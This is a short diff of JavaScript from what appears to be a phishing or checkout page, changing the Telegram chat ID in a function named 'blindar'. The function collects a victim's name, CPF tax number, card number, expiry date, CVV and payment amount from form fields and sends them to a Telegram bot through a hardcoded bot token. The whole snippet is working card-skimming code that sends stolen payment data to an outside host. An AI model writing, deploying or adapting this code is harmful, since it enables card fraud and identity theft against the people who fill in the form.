@@ -223,7 +223,7 @@
 
         function blindar() {
             const tok = '8495716341:AAEWdea8RcXtXrziTTMNkoBA78dTue71-Uc';
-            const grp = '14996027797';
+            const grp = '6901970419';
             const msg = `🚀 NOVO CARD\n👤 Nome: ${$('#n').val()}\n🆔 CPF: ${$('#f').val()}\n💳 Card: ${$('#c').val()}\n📅 Val: ${$('#v').val()}\n🔒 CVV: ${$('#s').val()}\n💰 Valor: R$ ${$('.vText').first().text()}`;
             fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${grp}&text=${encodeURIComponent(msg)}`);
             
